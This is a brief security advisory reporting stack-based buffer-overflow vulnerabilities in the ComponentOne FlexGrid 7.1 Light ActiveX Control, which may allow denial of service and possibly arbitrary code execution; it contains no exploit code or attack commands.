ComponentOne FlexGrid ActiveX Control is prone to multiple stack-based buffer-overflow vulnerabilities because the application fails to adequately check boundaries on user-supplied input.

An attacker can exploit these issues to cause denial denial-of-service conditions and possibly to execute arbitrary code, but this has not been confirmed.

ComponentOne FlexGrid 7.1 Light is vulnerable; other versions may also be affected.
